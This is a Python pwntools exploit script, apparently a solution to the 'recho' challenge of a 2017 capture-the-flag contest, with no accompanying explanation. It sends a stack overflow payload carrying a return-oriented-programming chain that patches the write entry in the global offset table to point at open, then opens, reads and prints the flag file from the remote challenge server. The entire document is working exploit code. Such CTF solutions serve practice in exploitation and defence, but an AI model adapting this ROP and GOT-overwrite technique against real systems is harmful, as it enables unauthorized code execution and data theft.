from pwn import *

local = False
if local:
	HOST, PORT = '0.0.0.0', 31337
	libc = ELF('/=/Downloads/recho/recho').libc
else:
	HOST, PORT = 'recho.2017.teamrois.cn', 9527
	libc = ELF('/=/Downloads/rcalc/libc.so.6')

poprdi = 0x4008a3
poprax = 0x4006fc
poprdx = 0x4006fe
poprsir15 = 0x4008a1
add_rdi_al = 0x40070d

write = 0x4005d0
printf = 0x4005e0
read = 0x400600

flag = 0x601058
format = 0x4008de

def go(payload):
	r = remote(HOST, PORT)
	if local:
		raw_input('>> ')
	r.send(str(len(payload)).ljust(0x10))
	r.send(payload)
	r.recvline()
	r.shutdown('write')
	data = r.recvall()
	print `data`
	return data

add = lambda address, value: p64(poprdi) + p64(address) + p64(poprax) + p64(value) + p64(add_rdi_al)

payload = 'a' * 0x38
delta = libc.symbols['open'] - libc.symbols['write']
delta %= 2 ** 64
carry = 0
for i, c in enumerate(p64(delta).rstrip('\x00')):
	payload += add(0x601018 + i, ord(c) + carry)
	carry = 1

payload += p64(poprdi) + p64(flag) + p64(poprsir15) + p64(0) + p64(0) + p64(write) + p64(poprdi) + p64(3) + p64(poprsir15) + p64(0x601088) + p64(0) + p64(poprdx) + p64(0xff) + p64(read) + p64(poprdi) + p64(format) + p64(poprsir15) + p64(0x601088) + p64(0) + p64(printf)

go(payload)